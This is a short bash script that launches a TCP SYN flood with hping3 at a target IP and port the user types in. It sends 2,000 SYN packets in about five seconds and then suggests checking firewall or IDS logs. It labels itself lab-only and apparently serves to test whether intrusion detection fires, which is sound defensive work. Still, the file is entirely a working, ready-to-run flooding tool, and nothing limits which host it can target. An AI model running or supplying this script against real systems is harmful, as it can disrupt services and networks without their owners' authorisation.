#!/usr/bin/env bash
#
# syn_flood.sh — Send 2 000 TCP SYN packets in <5s using hping3
# WARNING: Lab use only. Non-destructive outbound traffic.

# 1) Must be root
if [[ $EUID -ne 0 ]]; then
  echo "Error: This script must be run as root." >&2
  exit 1
fi

# 2) Prompt for target
read -rp "Target IP: " TARGET_IP
read -rp "Target port [default 80]: " TARGET_PORT
TARGET_PORT=${TARGET_PORT:-80}

# 3) Install hping3 if missing
if ! command -v hping3 &>/dev/null; then
  echo "Installing hping3..."
  apt-get update -qq
  apt-get install -y hping3
fi

# 4) Calculate interval for ~400 pps → 2 000 packets in ~5s
INTERVAL_US=2500

echo
echo "→ Sending 2 000 TCP SYN packets to ${TARGET_IP}:${TARGET_PORT}"
echo "   Interval: ${INTERVAL_US}µs → ~400 packets/sec → 5s total"
echo

# 5) Fire off the SYN flood
hping3 --quiet -S -p "${TARGET_PORT}" -i u"${INTERVAL_US}" -c 2000 "${TARGET_IP}"

echo
echo "Done. Check your firewall/IDS logs for alerts."